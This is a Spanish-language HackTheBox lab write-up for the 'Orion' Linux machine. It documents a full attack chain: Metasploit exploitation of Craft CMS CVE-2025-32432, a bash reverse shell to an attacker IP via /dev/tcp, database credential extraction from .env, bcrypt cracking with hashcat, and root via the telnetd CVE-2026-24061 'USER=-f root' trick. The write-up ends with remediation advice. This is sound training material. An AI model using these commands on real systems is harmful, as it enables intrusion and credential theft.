# Orion · HackTheBox

> **Ficha**
> 
> - **Nombre:** Orion
> - **IP:** 10.129.190.126
> - **SO:** Linux
> - **Dificultad:** Fácil
> - **Fecha:** 2/11/2026
> - **Tags:** #htb #linux #web #rce #bcrypt 

---
## Estructura de Directorios

![esquema directorios](writeups/htb/orion-img/esquema_directorios.png)
## 0. Resumen de la máquina

<!-- 3-5 líneas, se escribe al final. Incluye: vector de entrada, pivotes, cómo se consigue root, y en UNA frase el impacto (qué consigue un atacante). -->
La máquina expone un panel de administración de **Craft CMS 5.6.16** vulnerable al **CVE-2025-32432**, un fallo de ejecución remota de código sin autenticación en el módulo de transformación de imágenes. Explotando esta vulnerabilidad se obtiene acceso inicial como `www-data`. En la fase de post-explotación se localiza el fichero `.env` de la aplicación, que expone credenciales de la base de datos en texto claro. Accediendo a MariaDB se extrae el hash bcrypt del usuario `adam`, crackeado con el diccionario rockyou (`darkangel`). Una vez como `adam`, la enumeración de servicios internos revela un demonio `telnetd` de GNU inetutils 2.7 corriendo en **localhost**, vulnerable al **CVE-2026-24061**, que permite autenticarse como `root` sin contraseña mediante la manipulación de la variable de entorno `USER`. Un atacante que comprometa la aplicación web obtendría control total del sistema utilizando esta cadena de vulnerabilidades.

---

## MITRE ATT&CK

| Táctica              | Técnica                                     | ID        | Paso de la cadena                         |
| -------------------- | ------------------------------------------- | --------- | ----------------------------------------- |
| Reconnaissance       | Active Scanning                             | T1595     | Escaneo de puertos (nmap)                 |
| Reconnaissance       | Active Scanning: Wordlist scanning          | T1595.003 | Fuzzing de directorios (gobuster)         |
| Initial Access       | Exploit Public-Facing Application           | T1190     | CVE-2025-32432 Craft CMS preauth RCE      |
| Credential Access    | Unsecured Credentials: Credentials In Files | T1552.001 | .env con credenciales de la base de datos |
| Credential Access    | Brute Force: Password Cracking              | T1110.002 | hashcat -> darkangel                      |
| Privilege Escalation | Valid Accounts: Local Accounts              | T1078.003 | su adam con password crackeada            |
| Discovery            | Network Service Discovery                   | T1046     | netstat -> telnet en localhost            |
| Privilege Escalation | Exploitation for Privilege Escalation       | T1068     | CVE-2026-24061 telnet -> root             |

---

## 1. Reconocimiento

### 1.1. Comprobación de conectividad (ping / TTL)

<!-- ping, TTL 127 → Windows / TTL 64 → Linux -->
Antes de empezar, comprobamos que la máquina está activa y determinamos el sistema operativo a partir del TTL de la respuesta ICMP. Un TTL de 63 indica que estamos ante una máquina Linux (64 - 1 salto).

![ping1](writeups/htb/orion-img/ping1.png)

| TTL | SO      |
| --- | ------- |
| 63  | Linux   |
| 127 | Windows |
### 1.2. Configuración /etc/hosts

Añadimos la entrada correspondiente en `/etc/hosts` para resolver el dominio `orion.htb` a la IP de la máquina y verificamos que la resolución es correcta.

![etchosts](writeups/htb/orion-img/etchosts.png)

![ping2](writeups/htb/orion-img/ping2.png)
### 1.3. Escaneo de puertos (nmap)

Realizamos un escaneo completo de puertos con detección de versiones y sistema operativo para identificar la superficie de ataque expuesta.

```bash
nmap -p- --open -sVC -O -n -Pn orion.htb -oN orion_nmap.txt
```

![nmap](writeups/htb/orion-img/nmap.png)

| Puerto | Servicio | Versión       |
| ------ | -------- | ------------- |
| 22     | SSH      | OpenSSH 9.9p1 |
| 80     | HTTP     | nginx 1.18.0  |

### 1.4. Conclusiones del reconocimiento

<!-- Superficie de ataque, hipótesis inicial -->
La superficie de ataque es reducida, solo encontramos SSH en el puerto 22 y un servidor web nginx en el puerto 80. Dado que el acceso por SSH requiere credenciales, el vector más prometedor es la aplicación web. La hipótesis inicial es que el punto de entrada se encuentra en el servicio HTTP.

---

## 2. Enumeración web
### 2.1. Fuzzing de directorios (gobuster)

Realizamos fuzzing de directorios sobre el servidor web para descubrir rutas y recursos no enlazados desde la página principal.

```bash
gobuster dir -u http://orion.htb -w /home/kali/htb/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt
```

![gobuster](writeups/htb/orion-img/gobuster.png)

| Endpoint        | Estado | Observación                |
| --------------- | ------ | -------------------------- |
| /admin          | 302    | Redirección a /admin/login |
| /index          | 200    | Web principal              |
| /., /p1, /p2... | 200    | Web principal              |
El endpoint `/admin` redirige a `/admin/login`, lo que indica que existe un panel de administración.
### 2.2. Identificación de la tecnología

Accedemos al panel de login en `http://orion.htb/admin/login`. En la propia página podemos ver el CMS utilizado y su versión exacta: **Craft CMS 5.6.16**.

![identificar tecnologia](writeups/htb/orion-img/identificar_tecnologia.png)
### 2.3. Investigación del CVE / vector de ataque

Con la versión del CMS identificada, buscamos vulnerabilidades conocidas. Craft CMS 5.6.16 es vulnerable al **CVE-2025-32432**, un fallo de ejecución remota de código sin autenticación que afecta al módulo de transformación de imágenes. El exploit está disponible como módulo de Metasploit.

![investigar cve1](writeups/htb/orion-img/investigar_cve1.png)

---

## 3. Explotación y Acceso inicial

### 3.1. Búsqueda del módulo / exploit

Buscamos el módulo correspondiente al CVE en Metasploit y lo seleccionamos.

```bash

msfconsole -q

search CVE-2025-32432

use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432

```

![elegir exploit](writeups/htb/orion-img/elegir_exploit.png)
### 3.2. Configuración

El módulo ofrece dos targets. El target 0 (PHP In-Memory) genera sesiones inestables porque depende de que el worker de PHP permanezca activo. Usamos el target 1 (Unix/Linux Command Shell), que entrega un payload nativo de Linux independiente del proceso PHP.

![configurar exploit1](writeups/htb/orion-img/configurar_exploit1.png)

```bash

set target 1

set rhosts orion.htb

set lhost 10.10.14.235

```

![configurar exploit2](writeups/htb/orion-img/configurar_exploit2.png)
### 3.3. Ejecución

Lanzamos el exploit. El módulo explota el endpoint de generación de transformaciones de imagen, filtra la ruta de sesiones de PHP e inyecta el payload, obteniendo una sesión meterpreter como `www-data`.

![ejecutar exploit](writeups/htb/orion-img/ejecutar_exploit.png)

> **Acceso conseguido como ***www-data*****

---
## 4. Post-explotación inicial

### 4.1. Estabilización de TTY

La sesión meterpreter no ofrece una TTY completa. Para obtener una shell interactiva estable lanzamos una reverse shell bash hacia un listener netcat y estabilizamos la TTY con el método `script` + `stty`.

Abrimos el listener en nuestra máquina:

![netcat1](writeups/htb/orion-img/netcat1.png)

Desde la sesión meterpreter lanzamos la reverse shell:

![reverse shellbash](writeups/htb/orion-img/reverse_shellbash.png)

La conexión llega al listener:

![netcat2](writeups/htb/orion-img/netcat2.png)

Tratamiento de la TTY:

![tratamiento tty1](writeups/htb/orion-img/tratamiento_tty1.png)

![tratamiento tty2](writeups/htb/orion-img/tratamiento_tty2.png)

```bash
# Listener en Kali
nc -lvnp 4445

# Reverse shell en la sesión meterpreter
bash -c 'bash -i >& /dev/tcp/<IP>/4445 0>&1'

# Tratamiento de la TTY
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
					reset xterm

export TERM=xterm
export SHELL=bash
```

### 4.2. Enumeración del sistema

<!-- whoami, id, hostname, uname -a, sudo -l, SUID... -->
Con la shell estabilizada, comenzamos la enumeración del sistema buscando ficheros de configuración que puedan contener credenciales. Localizamos el fichero `.env` de la aplicación Craft CMS.

![buscar .env](writeups/htb/orion-img/buscar_.env.png)
### 4.3. Hallazgos relevantes

El fichero `.env` contiene las credenciales de la base de datos en texto claro, incluyendo usuario, contraseña y nombre de la base de datos.

![leer .env](writeups/htb/orion-img/leer_.env.png)

> **Credenciales de base de datos obtenidas**

> - **Usuario:** root

> - **Contraseña:** SuperSecureCraft123Pass!

> - **Base de datos:** orion

### 4.4. Exploración de la Base de Datos

Con las credenciales obtenidas accedemos a MariaDB y exploramos la base de datos `orion` en busca de información de usuarios.

![entraryver DBs](writeups/htb/orion-img/entraryver_DBs.png)

Listamos las tablas disponibles e identificamos la tabla `users` como objetivo:

![ver tablas](writeups/htb/orion-img/ver_tablas.png)

Consultamos el contenido completo de la tabla `users`:

![vertodo users](writeups/htb/orion-img/vertodo_users.png)

Extraemos específicamente el email y el hash de contraseña:

![veremailpassword users](writeups/htb/orion-img/veremailpassword_users.png)

> **Hash de la contraseña del usuario ***adam*** obtenido: `$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS`**

---

## 5. Escalada de privilegios
**www-data -> adam**

### 5.1. Enumeración

Comprobamos los permisos de `www-data` para identificar posibles vectores de escalada. Verificamos si el usuario tiene permisos sudo y buscamos binarios con el bit SUID activo.

`sudo -l` no devuelve ningún permiso para `www-data`:

![www-data sudo-l](writeups/htb/orion-img/www-data_sudo-l.png)

La búsqueda de binarios SUID tampoco revela nada aprovechable:

![findperm4000 www-data](writeups/htb/orion-img/findperm4000_www-data.png)

Al no encontrar vectores directos, la única vía disponible es el hash extraído de la base de datos.

### 5.2. Identificación del hash

Antes de intentar crackearlo, identificamos el tipo de hash para seleccionar el modo correcto en hashcat.

![identificar hash1](writeups/htb/orion-img/identificar_hash1.png)

![indetificar hash2](writeups/htb/orion-img/indetificar_hash2.png)


El prefijo `$2y$` identifica el algoritmo como **bcrypt**, en su variante para PHP. La estructura completa del hash es:

| Campo       | Valor                             | Descripción                                        |
| ----------- | --------------------------------- | -------------------------------------------------- |
| Algoritmo   | `$2y$`                            | Identifica bcrypt, versión 2y (implementación PHP) |
| Cost factor | `13`                              | 2¹³ = 8.192 iteraciones internas                   |
| Salt        | `e9zuohgFZzGtbQalcn9Mz.`          | 22 caracteres aleatorios únicos por contraseña     |
| Hash        | `5PJbjxobO0GMbXo8NHp3P/B42LUg0lS` | 31 caracteres, resultado del hasheo                |
### 5.3. Vector de escalada

<!-- qué permite escalar y por qué -->
El hash es bcrypt con cost factor 13 (modo 3200 en hashcat). Lanzamos un ataque de diccionario con rockyou contra el hash almacenado en `hash_adam.txt`.
```bash

hashcat -m 3200 hash_adam.txt /home/kali/htb/wordlists/rockyou.txt

```

![hashcat cracking](writeups/htb/orion-img/hashcat_cracking.png)

hashcat encuentra la contraseña: **`darkangel`**.
### 5.4. Explotación

Con la contraseña crackeada ejecutamos `su adam` para escalar al usuario `adam`.

![PrivEscto adam](writeups/htb/orion-img/PrivEscto_adam.png)
### 5.5. Flag de usuario



```bash
cat user.txt
```

> **user.txt**

---

## 6. Escalada de privilegios
**adam -> root**

### 6.1. Enumeración

Repetimos la enumeración ahora como `adam`. Comprobamos permisos sudo y binarios SUID.

Búsqueda de binarios SUID:

![findperm4000 adam](writeups/htb/orion-img/findperm4000_adam.png)

`sudo -l` tampoco devuelve permisos aprovechables para `adam`:

![adam sudo-l](writeups/htb/orion-img/adam_sudo-l.png)

Sin vectores directos, enumeramos los servicios que están corriendo internamente en la máquina con `netstat`:

![netstat](writeups/htb/orion-img/netstat.png)

Se detecta el demonio `telnetd` escuchando en **localhost**. Un servicio telnet activo en un sistema moderno es inusual y merece investigación.
### 6.2. Vector de escalada

<!-- qué permite escalar y por qué -->
Comprobamos la versión del cliente telnet instalado para determinar la versión del paquete:

![version telnet](writeups/htb/orion-img/version_telnet.png)

La versión es **GNU inetutils 2.7**. Investigamos si existe alguna vulnerabilidad conocida para esta versión:

![investigar cve2](writeups/htb/orion-img/investigar_cve2.png)

El **CVE-2026-24061** afecta a `telnetd` de GNU inetutils ≤ 2.7. El fallo permite a un usuario autenticado en el sistema autenticarse en el servicio telnet como `root` sin contraseña, pasando el valor `-f root` en la variable de entorno `USER`. El exploit es trivial y no requiere herramientas externas:

Repositorio que he utilizado para explotar esta vulnerabilidad y el código para reproducirla:  https://github.com/0xBlackash/CVE-2026-24061/blob/main/telnetd.py

![githubpayload telnet](writeups/htb/orion-img/githubpayload_telnet.png)
### 6.3. Explotación

Explotamos el CVE-2026-24061 manipulando la variable de entorno `USER` antes de lanzar el cliente telnet contra localhost:

```bash

USER="-f root" telnet -a 127.0.0.1

```

![payload telnet](writeups/htb/orion-img/payload_telnet.png)
### 6.4. Flag de root



```bash
cat root.txt
```

> **root.txt**

---

## 7. Remediación

<!-- Una recomendación por cada fallo encontrado. -->

- [ ] **Actualizar Craft CMS** a una versión superior a 5.6.16 que corrija el CVE-2025-32432.

- [ ] **Proteger el fichero .env** con permisos restrictivos (`chmod 600`) y nunca almacenar credenciales de producción en texto claro dentro del repositorio o en rutas accesibles por el servidor web.

- [ ] **Actualizar inetutils-telnetd (servidor Telnet)** a una versión superior a 2.7 que corrija el CVE-2026-24061. Si el servicio telnet no es necesario, deshabilitarlo completamente (`systemctl disable telnetd`).

- [ ] **Principio de mínimo privilegio en la BD:** el usuario de la aplicación no debería conectarse como `root`. Crear un usuario MariaDB con permisos únicamente sobre la base de datos `orion`.

- [ ] **Usar contraseñas fuertes** para cada capa (aplicación, BD, sistema). He crackeado la contraseña `darkangel` en menos de 2 minutos con el diccionario rockyou, eso significa que es una contraseña débil.

---

## 8. Anexos

### 8.1. Resumen de credenciales

| Contexto       | Usuario | Contraseña / Secreto     |
| -------------- | ------- | ------------------------ |
| MariaDB        | root    | SuperSecureCraft123Pass! |
| Sistema (adam) | adam    | darkangel                |

### 8.2. Resumen de endpoints

| Endpoint     | Método     | Auth | Descripción                     |
| ------------ | ---------- | ---- | ------------------------------- |
| /admin       | GET        | No   | Redirección a /admin/login      |
| /admin/login | GET / POST | No   | Panel de login Craft CMS 5.6.16 |

### 8.3. Comandos de referencia

```bash

# Reconocimiento

nmap -p- --open -sVC -Pn 10.129.190.126 -oN orion_nmap.txt

gobuster dir -u http://orion.htb -w ~/htb/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt


# Explotación

msfconsole -q

use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432

set target 1 && set rhosts orion.htb && set lhost 10.10.14.235 && run


# Reverse shell + TTY

nc -lvnp 4445

bash -c 'bash -i >& /dev/tcp/10.10.14.235/4445 0>&1'

script /dev/null -c bash  # Ctrl+Z → stty raw -echo; fg → export TERM=xterm SHELL=bash


# Post-explotación

find / -name '.env' 2>/dev/null

mariadb -u root -p -h localhost

SELECT email, password FROM users;


# Crackeo

hashcat --identify hash_adam.txt

hashcat -m 3200 hash_adam.txt /home/kali/htb/wordlists/rockyou.txt


# Privesc → root

telnet --version

USER="-f root" telnet -a 127.0.0.1

```

### 8.4. Herramientas utilizadas

| Herramienta | Versión                      | Uso                        |
| ----------- | ---------------------------- | -------------------------- |
| Nmap        | 7.991                        | Escanear puertos           |
| Gobuster    | 3.8.3                        | Fuzzing de directorios web |
| Metasploit  | 6.5.5-dev                    | Explotación CVE-2025-32432 |
| Netcat      | 1.10-50.1                    | Listener reverse shell     |
| MariaDB     | 15.1 Distrib 10.6.23-MariaDB | Acceso a la base de datos  |
| Hashcat     | 7.1.2                        | Crackeo del hash bcrypt    |
|             |                              |                            |

## 9. Vídeo del Writeup

> **Vídeo disponible bajo petición**
> El vídeo fue grabado durante la resolución de la máquina (antes de crear este WriteUp) y muestra el proceso **completo**, incluyendo errores y el razonamiento detrás de cada decisión.
> 
> Todos los vídeos de mis writeups están disponibles bajo petición.